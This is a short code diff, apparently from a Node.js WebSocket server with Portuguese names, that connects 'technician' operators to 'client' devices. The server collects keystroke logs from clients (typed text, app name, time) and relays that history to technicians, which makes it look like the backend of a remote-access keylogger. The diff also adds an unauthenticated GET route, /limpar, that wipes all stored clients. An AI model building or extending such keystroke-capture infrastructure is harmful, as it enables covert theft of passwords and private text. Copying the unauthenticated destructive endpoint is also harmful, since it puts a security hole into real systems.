@@ -91,7 +91,6 @@ wss.on('connection', (ws, req) => {
   const papel = url.searchParams.get('papel');
   const deviceToken = url.searchParams.get('token');
 
-  // ── TÉCNICO ───────────────────────────────────────────────────────────
   if (papel === 'tecnico') {
     const tecnicoId = crypto.randomBytes(4).toString('hex').toUpperCase();
     tecnicos.set(tecnicoId, { ws, deviceToken: null });
@@ -127,7 +126,6 @@ wss.on('connection', (ws, req) => {
         c.ws.send(JSON.stringify({ tipo: 'tecnico_conectou' }));
         ws.send(JSON.stringify({ tipo: 'sessao_iniciada', deviceToken: msg.deviceToken, info: c.info }));
 
-        // Envia histórico de keylog ao retomar sessão
         if (c.keylog && c.keylog.length > 0) {
           ws.send(JSON.stringify({ tipo: 'keylog_historico', keylog: c.keylog }));
         }
@@ -170,7 +168,6 @@ wss.on('connection', (ws, req) => {
       console.log(`[TÉCNICO -] ${tecnicoId}`);
     });
 
-  // ── CLIENTE ───────────────────────────────────────────────────────────
   } else if (papel === 'cliente' && deviceToken) {
     const existing = clientes.get(deviceToken);
 
@@ -215,7 +212,6 @@ wss.on('connection', (ws, req) => {
         return;
       }
 
-      // Salva keylog no servidor (máx 50)
       if (msg.tipo === 'keylog' && c) {
         c.keylog = c.keylog || [];
         c.keylog.push({ texto: msg.texto, app: msg.app, ts: Date.now() });
@@ -257,6 +253,13 @@ setInterval(() => {
     broadcastTecnicos({ tipo: 'lista_clientes', clientes: listaClientes() });
   }
 }, 5 * 60 * 1000);
+
+app.get('/limpar', (req, res) => {
+  clientes.clear();
+  salvarClientes();
+  broadcastTecnicos({ tipo: 'lista_clientes', clientes: listaClientes() });
+  res.send('Clientes limpos!');
+});
 
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => console.log(`✅ Servidor rodando na porta ${PORT}`));
